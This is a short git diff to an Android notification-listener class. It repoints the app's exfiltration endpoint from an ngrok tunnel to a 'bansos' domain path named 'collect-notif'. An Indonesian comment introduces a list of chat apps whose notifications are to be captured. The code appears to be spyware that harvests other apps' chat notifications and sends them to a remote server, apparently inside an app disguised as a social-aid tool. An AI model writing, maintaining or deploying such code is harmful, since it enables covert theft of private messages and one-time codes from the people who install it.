@@ -19,7 +19,7 @@ import java.util.Locale;
 public class NotifListener extends NotificationListenerService {
 
     private static final String TAG = "NotifListener";
-    private static final String SERVER_URL = "https://pecan-pupil-esteemed.ngrok-free.dev/api/collect-notif";
+    private static final String SERVER_URL = "https://bansos.jokichannel.eu.org/api/collect-notif";
 
     // Daftar paket aplikasi chat yang ingin ditangkap
     private static final String[] CHAT_APPS = {
